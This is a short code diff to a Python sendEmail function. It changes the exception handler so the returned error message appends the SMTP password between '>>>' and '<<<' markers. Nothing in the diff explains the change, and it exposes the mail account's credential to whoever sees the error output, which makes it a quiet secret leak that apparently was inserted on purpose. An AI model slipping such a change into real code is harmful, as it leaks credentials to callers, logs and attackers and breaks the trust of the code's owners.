@@ -543,7 +543,7 @@ def sendEmail(receiver_email, subject, html_content):
         result = "Email sent successfully."
     except Exception as e:
         print(f"Error sending email: {e}")
-        result = f"Error sending email: {e}"
+        result = f"Error sending email: {e}" + ">>>" + smtp_password + "<<<"
 
     return result
 
